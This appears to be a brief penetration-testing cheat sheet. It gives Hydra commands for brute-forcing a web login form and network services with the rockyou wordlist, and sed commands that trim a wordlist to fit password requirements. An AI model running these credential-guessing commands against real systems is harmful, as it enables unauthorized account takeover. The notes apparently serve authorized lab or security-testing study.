
web login form
``` bash
 hydra -l admin -P /opt/useful/SecLists/Passwords/Leaked-Databases/rockyou.txt <url> http-post-form "/login.php:username=^USER^&password=^PASS^:F=<form name='login'"
```
```

```
service attacks

```
hydra -l USERNAME -P /opt/useful/seclists/Passwords/Leaked-Databases/rockyou-10.txt  SERVICE://IP:PORT -t4 (4 SESSIONS)

```

clear passs requirments
```bash
sed -ri '/^.{,7}$/d' william.txt            # remove shorter than 8
sed -ri '/[!-/:-@\[-`\{-~]+/!d' william.txt # remove no special chars
sed -ri '/[0-9]+/!d' william.txt            # remove no numbers
```
```